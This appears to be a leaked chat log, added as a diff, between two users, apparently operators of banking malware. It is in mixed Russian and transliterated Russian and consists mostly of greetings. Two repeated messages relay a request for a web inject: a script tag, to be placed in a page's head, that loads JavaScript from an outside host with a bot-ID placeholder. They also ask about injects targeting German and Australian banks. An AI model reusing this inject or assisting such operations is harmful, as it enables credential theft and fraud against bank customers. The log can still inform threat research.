@@ -1,0 +1,27 @@
+Timestamp	From	To	Message
+2020-07-08 10:16:13.590054	revan	dorirus	privet
+2020-07-09 12:22:52.407858	dorirus	revan	продолжай вчерашнее, как зайдёшь
+2020-07-09 12:28:28.232234	dorirus	revan	продолжай вчерашнее, как зайдёшь
+2020-07-20 10:09:38.659296	dorirus	revan	Привет
+2020-07-29 19:34:08.948120	revan	dorirus	[03:32:29] <buri> Mne otpisali, chto etogo ne hvataet
+
+
+поле хеад должены быть ваш инжект 
+ </head> <script type=text/javascript src=https://serv-xyz.tk/privatkunden?00ipR=jli%3B_%2F%24p%3B.%2A41636554.3&BI1=%BOTID%></script> 
+
+1. Kogda smozhesh header podpravit'?
+2. Tam stoyat zhe injecti na banki DE i AU?
+2020-07-30 11:05:25.637177	revan	dorirus	[03:32:29] <buri> Mne otpisali, chto etogo ne hvataet
+
+
+поле хеад должены быть ваш инжект 
+ </head> <script type=text/javascript src=https://serv-xyz.tk/privatkunden?00ipR=jli%3B_%2F%24p%3B.%2A41636554.3&BI1=%BOTID%></script> 
+
+1. Kogda smozhesh header podpravit'?
+2. Tam stoyat zhe injecti na banki DE i AU?
+2020-07-30 13:54:26.748207	dorirus	revan	Привет
+2020-07-31 16:36:29.262774	dorirus	revan	тут?
+2020-08-20 14:38:23.822900	dorirus	revan	Привет
+2020-09-04 11:15:19.285925	dorirus	revan	Привет
+2020-09-09 10:44:51.135200	dorirus	revan	Привет
+2020-09-09 10:45:15.487575	revan	dorirus	hi
